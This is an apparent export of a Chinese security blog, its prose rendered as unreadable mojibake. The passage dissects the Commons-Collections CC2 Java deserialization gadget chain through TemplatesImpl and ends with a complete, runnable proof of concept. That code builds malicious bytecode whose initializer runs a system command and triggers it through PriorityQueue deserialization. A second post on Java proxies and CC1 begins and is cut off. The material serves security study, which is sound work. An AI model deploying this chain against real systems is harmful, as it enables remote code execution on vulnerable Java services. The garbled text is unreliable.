_name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•å¸®æˆ‘ä»¬è·å–äº†<code>loader</code>ï¼Œ<code>_bytecodes</code>å¯ä»¥è®¾ç½®ä¸ºæˆ‘ä»¬æ„å»ºçš„æ¶æ„ç±»å­—èŠ‚ç æ•°ç»„ï¼Œæ³¨æ„åˆ°å¦‚æœæˆ‘ä»¬çš„æ¶æ„ç±»çš„çˆ¶ç±»ä¸ä¸º<code>ABSTRACT_TRANSLET</code>å°±ä¼šå¯¼è‡´<code>_transletIndex</code>ä¸º-1æŠ›å‡ºå¼‚å¸¸ç»ˆæ­¢ç¨‹åºï¼Œè¿™åœ¨ä¸Šé¢å¯ä»¥æ‰¾åˆ°</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">_transletIndex</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œ<code>_tfactory</code>è¢«é»˜è®¤è®¾ç½®ä¸ºç©ºï¼Œè‹¥ä¸å¤„ç†ä¼šé€ æˆç©ºæŒ‡é’ˆå¼‚å¸¸ï¼Œå¯é€šè¿‡åå°„ä¿®æ”¹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>æ¡ä»¶ç¬¦åˆåï¼Œæˆ‘ä»¬çš„æ¶æ„ç±»å­—èŠ‚ç å°±ä¼šè¢«<code>loader</code>åŠ è½½è¿›å†…å­˜ï¼Œä¿å­˜è¿›<code>_class</code>æ•°ç»„ä¸­</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">_class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line"><span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check if this is the main class</span></span><br><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">_transletIndex = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">_auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å¯»æ‰¾ä¸Šå±‚æ–¹æ³•ï¼Œåœ¨åŒç±»çš„<code>getTransletInstance()</code>å‘ç°</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">            <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">            <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">            translet.postInitialization();</span><br><span class="line">            translet.setTemplates(<span class="built_in">this</span>);</span><br><span class="line">            translet.setServicesMechnism(_useServicesMechanism);</span><br><span class="line">            translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">            <span class="keyword">if</span> (_auxClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">                translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> translet;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>_class</code>ä¸ºç©ºæ—¶ï¼Œè°ƒç”¨äº†<code>defineTransletClasses()</code>æ–¹æ³•ï¼Œä½†æ˜¯æœ‰ä¸ªå‰ææ˜¯<code>_name</code>ä¸ä¸ºç©ºï¼Œè¯¥å­—æ®µé»˜è®¤ä¸ºç©ºä¸”è¢«<code>private</code>ä¿®é¥°ï¼Œä½†ä¹Ÿå¯ä»¥é€šè¿‡åå°„ä¿®æ”¹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">_name</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>åé¢ï¼Œ<code>_class[_transletIndex].newInstance()</code>è¯´æ˜æ­¤å¤„æ¶æ„ç±»è¢«å®ä¾‹åŒ–ï¼Œè¿™ä¹Ÿæ˜¯è¯¥é“¾çš„ç»ˆç‚¹ã€‚ç»§ç»­å¯»æ‰¾è°ƒç”¨äº†<code>getTransletInstance()</code>çš„ä¸Šå±‚æ–¹æ³•ï¼Œåœ¨åŒç±»çš„<code>newTransformer()</code>ä¸­</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">        transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">            _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_uriResolver != <span class="literal">null</span>) &#123;</span><br><span class="line">            transformer.setURIResolver(_uriResolver);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">            transformer.setSecureProcessing(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> transformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨<code>newTransformer()</code>æ˜¯é€šè¿‡<code>InvokerTransformer</code>è¿›è¡Œçš„ï¼Œåœ¨<code>transformingComparator</code>æ‰§è¡Œ<code>compare()</code>æ–¹æ³•æ—¶</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">        <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> (O)<span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">        <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> (O)<span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦æ„é€ çš„<code>InvokerTransformer</code>éœ€è¦è°ƒç”¨<code>newTransformer()</code>æ–¹æ³•ï¼Œæ‰€ä»¥<code>obj1</code>æˆ–<code>obj2</code>éœ€è¦æ˜¯ä¸€ä¸ª<code>TemplatesImpl</code>å®ä¾‹ï¼Œå¾€ä¸Šè¿½æº¯<code>siftDownUsingComparator()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">                comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">                c = queue[child = right];</span><br><span class="line">            <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            queue[k] = c;</span><br><span class="line">            k = child;</span><br><span class="line">        &#125;</span><br><span class="line">        queue[k] = x;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>obj1</code>å’Œ<code>obj2</code>åˆ†åˆ«å¯¹åº”<code>(E) c</code>å’Œ<code>(E) queue[right]</code>ï¼Œå…¶å®éƒ½æ˜¯<code>queue[]</code>æ•°ç»„çš„å…ƒç´ ï¼Œåªéœ€è¦è®©å…¶æ•°ç»„é‡Œé¢éƒ½æ˜¯<code>TemplatesImpl</code>å®ä¾‹å°±å¥½äº†ï¼Œ<code>queue[]</code>æ•°ç»„åœ¨<code>offer()</code>ä¸­è¢«èµ‹å€¼</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">offer</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (e == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> size;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= queue.length)</span><br><span class="line">            grow(i + <span class="number">1</span>);</span><br><span class="line">        size = i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">            queue[<span class="number">0</span>] = e;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftUp(i, e);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>offer()</code>çš„å‚æ•°ä¸è¿˜æ˜¯ä»<code>add()</code>ä¸­ä¼ è¿›æ¥çš„å˜›ï¼æ‰€ä»¥æŠŠåŸæ¥çš„ä¼ è¿›å»çš„å€¼æ”¹æˆ<code>TemplatesImpl</code>å®ä¾‹å°±è¡Œäº†ï¼Œä¸‹é¢æ­£å¼æ„é€ é“¾</p><p>æ„å»ºæ¶æ„ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">test</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> test.makeClassInitializer();</span><br><span class="line">constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">test.setSuperclass(superClass);</span><br><span class="line"><span class="type">byte</span>[] bytes = test.toBytecode();</span><br></pre></td></tr></table></figure><p>å®ä¾‹åŒ–<code>TemplatesImpl</code>å¯¹è±¡å¹¶é€šè¿‡åå°„èµ‹å€¼</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">name.set(templatesImpl, <span class="string">&quot;any&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span>  templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">bytecodes.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactory.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure><p>æ„å»º<code>InvokerTransformer</code>å¯¹è±¡æŒ‡å‘<code>TemplatesImpl</code>ç±»çš„<code>newTransformer()</code>æ–¹æ³•ï¼Œæ„å»º<code>TransformingComparator</code>å¯¹è±¡ä½¿å…¶<code>compare()</code>æ–¹æ³•è§¦å‘<code>InvokerTransformer</code>å¯¹è±¡çš„<code>transform()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br></pre></td></tr></table></figure><p>æ„å»º<code>PriorityQueue</code>å¯¹è±¡ï¼Œä¾ç„¶è¦å¤„ç†æå‰ç»ˆæ­¢çš„é—®é¢˜ï¼Œè¿™é‡Œçš„æ€è·¯æ˜¯ä¸ä½¿ç”¨<code>add()</code>æ–¹æ³•è€Œæ˜¯åˆ©ç”¨åå°„ç›´æ¥ä¿®æ”¹<code>size</code>å’Œ<code>queue</code>å­—æ®µçš„å€¼ï¼Œä½¿å…¶ä¼ é€’çš„<code>obj</code>ä¸º<code>TemplatesImpl</code>å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PriorityQueue&lt;TemplatesImpl&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> priorityQueue.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">queue.set(priorityQueue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl,templatesImpl&#125;);</span><br><span class="line"><span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">size.set(priorityQueue, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>ç”±æ­¤ï¼Œä¾èµ–<code>TemplatesImpl</code>çš„CC2é“¾æ„é€ å®Œæ¯•ï¼Œå…¨é“¾å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">test</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> test.makeClassInitializer();</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        test.setSuperclass(superClass);</span><br><span class="line">        <span class="type">byte</span>[] bytes = test.toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templatesImpl, <span class="string">&quot;any&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span>  templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line">        PriorityQueue&lt;TemplatesImpl&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> priorityQueue.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queue.set(priorityQueue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl,templatesImpl&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(priorityQueue, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        deserialize(<span class="string">&quot;cc2-2.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;cc2-2.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(filename)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸æ€»ç»“äº†ï¼Œæ„Ÿè§‰å‰é¢è¯´çš„å¤Ÿæ¸…æ™°äº†ï¼ˆå˜¿</p><br/>]]></content>
      
      
      <categories>
          
          <category> CTFç›¸å…³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaä»£ç†æœºåˆ¶åŠCC1é“¾æ‹¾é—è¡¥é˜™</title>
      <link href="/2025/12/17/Java%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6%E5%8F%8ACC1%E9%93%BE%E6%8B%BE%E9%81%97%E8%A1%A5%E9%98%99/"/>
      <url>/2025/12/17/Java%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6%E5%8F%8ACC1%E9%93%BE%E6%8B%BE%E9%81%97%E8%A1%A5%E9%98%99/</url>
      
        <content type="html"><![CDATA[<h1 id="Javaä»£ç†æœºåˆ¶åŠCC1é“¾æ‹¾é—è¡¥é˜™"><a href="#Javaä»£ç†æœºåˆ¶åŠCC1é“¾æ‹¾é—è¡¥é˜™" class="headerlink" title="Javaä»£ç†æœºåˆ¶åŠCC1é“¾æ‹¾é—è¡¥é˜™"></a>Javaä»£ç†æœºåˆ¶åŠCC1é“¾æ‹¾é—è¡¥é˜™</h1><p>åœ¨åŸå…ˆçš„CC1é“¾è§£æä¸­ï¼Œæˆ‘ä»¬åˆ©ç”¨<code>transformedMap</code>ç±»çš„<code>checkSetValue()</code>æ–¹æ³•è§¦å‘<code>transform()</code>ï¼Œæ­¤å¤–CC1é“¾è¿˜æœ‰å¦å¤–ä¸€ç§å®ç°æ–¹æ³•ï¼Œé€šè¿‡ä¾èµ–<code>LazyMap</code>ç±»çš„<code>get()</code>è¿›è¡Œè§¦å‘ã€‚åœ¨æ­¤ä¹‹å‰ï¼Œéœ€è¦å¯¹Javaçš„ä»£ç†æœºåˆ¶æœ‰ä¸€å®šäº†è§£</p><br/><h2 id="ä»£ç†æœºåˆ¶"><a href="#ä»£ç†æœºåˆ¶" class="headerlink" title="ä»£ç†æœºåˆ¶"></a>ä»£ç†æœºåˆ¶</h2><p>ä»£ç†æ¨¡å¼ä½¿ç”¨ä»£ç†å¯¹è±¡æ¥ä»£æ›¿å¯¹çœŸå®å¯¹è±¡çš„è®¿é—®ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ä¸ä¿®æ”¹åŸç›®æ ‡å¯¹è±¡çš„å‰æä¸‹ï¼Œæä¾›é¢å¤–çš„åŠŸèƒ½æ“ä½œï¼Œæ‰©å±•ç›®æ ‡å¯¹è±¡çš„åŠŸèƒ½ã€‚Javaä¸­çš„ä»£ç†å¤§è‡´å¯åˆ†æˆé™æ€ä»£ç†å’ŒåŠ¨æ€ä»£ç†ä¸¤ç±»</p><h3 id="é™æ€ä»£ç†"><a href="#é™æ€ä»£ç†" class="headerlink" title="é™æ€ä»£ç†"></a>é™æ€ä»£ç†</h3><p>é™æ€ä»£ç†é€šè¿‡ä»£ç†å¯¹è±¡å’Œç›®æ ‡å¯¹è±¡å®ç°åŒä¸€ä¸ªæ¥å£ï¼Œè¾¾æˆäº†é€šè¿‡ä»£ç†å¯¹è±¡è®¿é—®ç›®æ ‡å¯¹è±¡ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªé™æ€ä»£ç†çš„å®ç°æ­¥éª¤</p><p>å®šä¹‰æ¥å£</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰ç›®æ ‡ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RealCalculator</span> <span class="keyword">implements</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰ä»£ç†ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CalculatorProxy</span> <span class="keyword">implements</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Calculator realCalculator;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CalculatorProxy</span><span class="params">(Calculator realCalculator)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.realCalculator = realCalculator;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="comment">// è°ƒç”¨ç›®æ ‡å¯¹è±¡çš„addæ–¹æ³•</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> realCalculator.add(a, b);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åº”ç”¨é™æ€ä»£ç†æ¨¡å¼</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">Calculator</span> <span class="variable">Calc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RealCalculator</span>();</span><br><span class="line">        <span class="type">Calculator</span> <span class="variable">proxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CalculatorProxy</span>(Calc);</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> proxy.add(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span 